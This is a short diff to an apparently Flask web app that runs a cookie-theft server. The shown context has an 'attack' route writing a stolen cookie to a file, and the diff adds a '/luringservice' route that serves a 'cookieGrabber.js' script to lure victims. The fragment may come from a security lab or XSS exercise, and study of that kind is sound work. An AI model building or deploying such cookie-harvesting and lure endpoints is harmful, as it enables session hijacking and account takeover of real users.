@@ -13,6 +13,9 @@ def attack():
    		fo.write(cookie)
 	return render_template('index.html')
 
+@app.route('/luringservice')
+def lure():
+	return app.send_static_file('cookieGrabber.js')
 
 @app.route('/')
 def home_page():
